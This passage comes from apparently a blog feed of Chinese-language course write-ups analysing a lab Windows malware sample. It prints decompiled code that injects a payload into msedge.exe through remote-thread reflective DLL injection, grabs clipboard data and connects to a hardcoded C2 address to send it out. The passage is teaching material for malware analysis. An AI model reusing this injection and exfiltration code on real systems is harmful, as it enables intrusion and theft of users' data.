&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( hObject )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)sub_140001500(hObject, &lt;span style="color:#f92672">&amp;amp;&lt;/span>pSid1) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( EqualSid(pSid1, pSid2) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> szExeFile &lt;span style="color:#f92672">=&lt;/span> pe.szExeFile;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v4 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#e6db74">L&lt;/span>&lt;span style="color:#e6db74">&amp;#34;msedge.exe&amp;#34;&lt;/span> &lt;span style="color:#f92672">-&lt;/span> (&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)pe.szExeFile;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> ( &lt;span style="color:#ae81ff">1&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v5 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>szExeFile;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">*&lt;/span>szExeFile &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(WCHAR &lt;span style="color:#f92672">*&lt;/span>)((&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)szExeFile &lt;span style="color:#f92672">+&lt;/span> v4) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">++&lt;/span>szExeFile;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">!&lt;/span>v5 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v6 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_14;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v6 &lt;span style="color:#f92672">=&lt;/span> v5 &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(WCHAR &lt;span style="color:#f92672">*&lt;/span>)((&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)szExeFile &lt;span style="color:#f92672">+&lt;/span> v4) &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LABEL_14:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">!&lt;/span>v6 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> th32ProcessID &lt;span style="color:#f92672">=&lt;/span> pe.th32ProcessID;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> free(pSid1);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> CloseHandle(hObject);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> ( &lt;span style="color:#f92672">!&lt;/span>th32ProcessID &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> Process32NextW(hSnapshot, &lt;span style="color:#f92672">&amp;amp;&lt;/span>pe) );
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> free(pSid2);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> CloseHandle(hSnapshot);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> th32ProcessID;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v2 &lt;span style="color:#f92672">=&lt;/span> GetLastError();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001260(&lt;span style="color:#e6db74">&amp;#34;Process32First failed with error %lu&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, v2);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> CloseHandle(hSnapshot);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>} 
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>首先，他先利用&lt;code>CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)&lt;/code>把當前系統中所有的process都snapshot，並回傳指定快照集的開啟控制碼(handle)&lt;/p></description></item><item><title>Simple Reverse - 0x21(2023 Lab - WinMalware - Extract Next Stage Payload - 3)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x212023-lab---winmalware---extract-next-stage-payload---3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x212023-lab---winmalware---extract-next-stage-payload---3/</guid><description>&lt;h1 id="simple-reverse---0x212023-lab---winmalware---extract-next-stage-payload---3">
 Simple Reverse - 0x21(2023 Lab - WinMalware - Extract Next Stage Payload - 3)
 &lt;a class="anchor" href="#simple-reverse---0x212023-lab---winmalware---extract-next-stage-payload---3">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex">VirtualAllocEx&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/Memory/memory-protection-constants">記憶體保護常數&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory">WriteProcessMemory&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread">CreateRemoteThread&lt;/a>&lt;/li>
&lt;li>Export Address Table(EAT)
&lt;blockquote>
&lt;p>&lt;img src="https://hackmd.io/_uploads/rJuBbwaGT.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/HJEI-P6zp.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/S1Qu-PTM6.png" alt="" />&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code &lt;code>sub_140001A60&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">sub_140001A60&lt;/span>(DWORD edge_pid, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>pe_file, SIZE_T pe_file_size)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DWORD v4; &lt;span style="color:#75715e">// eax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> DWORD LastError; &lt;span style="color:#75715e">// eax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> HANDLE hProcess; &lt;span style="color:#75715e">// [rsp+40h] [rbp-38h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>lpBaseAddress; &lt;span style="color:#75715e">// [rsp+48h] [rbp-30h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> LPTHREAD_START_ROUTINE lpStartAddress; &lt;span style="color:#75715e">// [rsp+50h] [rbp-28h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v9; &lt;span style="color:#75715e">// [rsp+58h] [rbp-20h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> DWORD ThreadId; &lt;span style="color:#75715e">// [rsp+60h] [rbp-18h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v9 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_1400018F0(pe_file, &lt;span style="color:#f92672">&amp;amp;&lt;/span>v9);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v9 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> hProcess &lt;span style="color:#f92672">=&lt;/span> OpenProcess(&lt;span style="color:#ae81ff">0x43Au&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, edge_pid);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( hProcess )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lpBaseAddress &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)VirtualAllocEx(hProcess, &lt;span style="color:#ae81ff">0&lt;/span>i64, pe_file_size, &lt;span style="color:#ae81ff">0x3000u&lt;/span>, &lt;span style="color:#ae81ff">0x40u&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( WriteProcessMemory(hProcess, lpBaseAddress, pe_file, pe_file_size, &lt;span style="color:#ae81ff">0&lt;/span>i64) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lpStartAddress &lt;span style="color:#f92672">=&lt;/span> (LPTHREAD_START_ROUTINE)&lt;span style="color:#f92672">&amp;amp;&lt;/span>lpBaseAddress[v9];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> CreateRemoteThread(hProcess, &lt;span style="color:#ae81ff">0&lt;/span>i64, &lt;span style="color:#ae81ff">0&lt;/span>i64, (LPTHREAD_START_ROUTINE)&lt;span style="color:#f92672">&amp;amp;&lt;/span>lpBaseAddress[v9], &lt;span style="color:#ae81ff">0&lt;/span>i64, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#f92672">&amp;amp;&lt;/span>ThreadId);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001260(&lt;span style="color:#e6db74">&amp;#34;remote thread id: %lu, loader address: %p&amp;#34;&lt;/span>, ThreadId, lpStartAddress);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> LastError &lt;span style="color:#f92672">=&lt;/span> GetLastError();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001260(&lt;span style="color:#e6db74">&amp;#34;WriteProcessMemory failed, %lu&amp;#34;&lt;/span>, LastError);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v4 &lt;span style="color:#f92672">=&lt;/span> GetLastError();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001260(&lt;span style="color:#e6db74">&amp;#34;OpenProcess failed, %lu&amp;#34;&lt;/span>, v4);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001260(&lt;span style="color:#e6db74">&amp;#34;get_reflectivce_loader_offset failed&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple Reverse - 0x22(2023 Lab - WinMalware - Collect)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x222023-lab---winmalware---collect/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x222023-lab---winmalware---collect/</guid><description>&lt;h1 id="simple-reverse---0x222023-lab---winmalware---collect">
 Simple Reverse - 0x22(2023 Lab - WinMalware - Collect)
 &lt;a class="anchor" href="#simple-reverse---0x222023-lab---winmalware---collect">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>如果想要分析DLL，可以從以下三個地方切入&lt;/p>
&lt;ul>
&lt;li>_DllMainCRTStartup (DLL 載入和移除時的初始化與收尾)
&lt;ul>
&lt;li>DllMain / DllEntryPoint / CRT_INIT (function signature 相同)&lt;/li>
&lt;li>找有三個參數的 function call
&lt;img src="https://hackmd.io/_uploads/Sk0GgCaz6.png" alt="" />
範例就大概像這樣，從&lt;code>_DllMainCRTStartup&lt;/code>底下有&lt;code>call _CRT_INIT&lt;/code>和&lt;code>call DllEntryPoint&lt;/code>(&lt;code>DllMain&lt;/code>在比較下面)
&lt;img src="https://hackmd.io/_uploads/HklyZRTf6.png" alt="" />&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Exported Functions&lt;/li>
&lt;li>TLS Callback&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/winuser/nf-winuser-openclipboard">OpenClipboard&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/winuser/nf-winuser-getclipboarddata">GetClipboardData&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/winbase/nf-winbase-globallock">globalLock&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/cpp/c-runtime-library/reference/itoa-itow?view=msvc-170">_itoa&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>IDA解析的source code很常會出現明明沒有return value但還是自動建立的狀況，所以適時的刪除return value(Shift+DEL)是對分析比較好的做法&lt;/p>
&lt;ul>
&lt;li>DllMain
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
 if ( fdwReason == 1 )
 {
 MessageBoxA(0i64, &amp;#34;Reflective Dll Injection success. Remember to delete the persistence file&amp;#34;, &amp;#34;eductf-lab&amp;#34;, 0);
 my_main(); // 不重要的東西
 collect_and_exfiltrate();
 }
 return 1;
}
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>collect_and_exfiltrate
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">void collect_and_exfiltrate(void)
{
 PUCHAR pbInput; // [rsp+28h] [rbp-10h] BYREF

 pbInput = 0i64;
 collect_data(&amp;amp;pbInput);
 exfiltrate(pbInput);
}
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>collect_data
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">void __fastcall collect_data(char **pbInput)
{
 char *pbInput_1; // [rsp+28h] [rbp-10h] BYREF

 collect_get_clipboard_data(&amp;amp;pbInput_1);
 *pbInput = pbInput_1;
}
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>collect_get_clipboard_data
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">void __fastcall collect_get_clipboard_data(LPVOID *pbInput)
{
 HANDLE ClipboardData; // rax
 void *v3; // rsi
 int LastError; // eax
 char Buffer[34]; // [rsp+26h] [rbp-22h] BYREF

 if ( OpenClipboard(0i64) )
 {
 ClipboardData = GetClipboardData(1u);
 v3 = ClipboardData;
 if ( ClipboardData )
 {
 *pbInput = GlobalLock(ClipboardData);
 GlobalUnlock(v3);
 }
 else
 {
 LastError = GetLastError();
 _itoa(LastError, Buffer, 10);
 }
 }
 CloseClipboard();
}
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>目前要分析的重點著重在DllMain中，所以其他的切入點可以先不管，並且先聚焦在collect data身上。其實作者一開始就有把debug information都放在這邊，所以分析可以更順暢&lt;/p></description></item><item><title>Simple Reverse - 0x23(2023 Lab - WinMalware - Exfiltrate)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x232023-lab---winmalware---exfiltrate/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x232023-lab---winmalware---exfiltrate/</guid><description>&lt;h1 id="simple-reverse---0x232023-lab---winmalware---exfiltrate">
 Simple Reverse - 0x23(2023 Lab - WinMalware - Exfiltrate)
 &lt;a class="anchor" href="#simple-reverse---0x232023-lab---winmalware---exfiltrate">#&lt;/a>
&lt;/h1>
&lt;h2 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>請根據 next stage payload 的行為，分析 capture.pcapng 中的封包，找出並解密被滲出/傳送到 C2 server 的資料。&lt;/p>&lt;/blockquote>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/winsock/nf-winsock-wsastartup">WSAStartup&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/winsock/nf-winsock-htons">htons&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/winsock2/nf-winsock2-socket">socket&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/winsock/sockaddr-2">sockaddr&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/winsock2/nf-winsock2-wsaconnect">WSAConnect&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>exfiltrate
:::spoiler source
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">exfiltrate&lt;/span>(PUCHAR pbInput)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">__int64&lt;/span> s[&lt;span style="color:#ae81ff">2&lt;/span>]; &lt;span style="color:#75715e">// [rsp+28h] [rbp-10h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> connect_to_c2(s);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> send_collected_data_to_c2(s[&lt;span style="color:#ae81ff">0&lt;/span>], pbInput);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> shutdown(s[&lt;span style="color:#ae81ff">0&lt;/span>], &lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> closesocket(s[&lt;span style="color:#ae81ff">0&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;li>connect_to_c2
:::spoiler source
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">connect_to_c2&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#f92672">*&lt;/span>a1)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v2; &lt;span style="color:#75715e">// rax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">sockaddr&lt;/span> name; &lt;span style="color:#75715e">// [rsp+20h] [rbp-1B8h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">WSAData&lt;/span> WSAData; &lt;span style="color:#75715e">// [rsp+30h] [rbp-1A8h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">!&lt;/span>WSAStartup(&lt;span style="color:#ae81ff">0x202u&lt;/span>, &lt;span style="color:#f92672">&amp;amp;&lt;/span>WSAData) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&amp;amp;&lt;/span>name.sa_data[&lt;span style="color:#ae81ff">2&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">168470720&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>name.sa_data &lt;span style="color:#f92672">=&lt;/span> htons(&lt;span style="color:#ae81ff">0x2BB3u&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> name.sa_family &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v2 &lt;span style="color:#f92672">=&lt;/span> socket(&lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">6&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>a1 &lt;span style="color:#f92672">=&lt;/span> v2;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> connect(v2, &lt;span style="color:#f92672">&amp;amp;&lt;/span>name, &lt;span style="color:#ae81ff">16&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;li>send_collected_data_to_c2
:::spoiler source
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">send_collected_data_to_c2&lt;/span>(SOCKET s, PUCHAR pbInput)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>v4; &lt;span style="color:#75715e">// rbx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v5; &lt;span style="color:#75715e">// esi
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> i; &lt;span style="color:#75715e">// eax
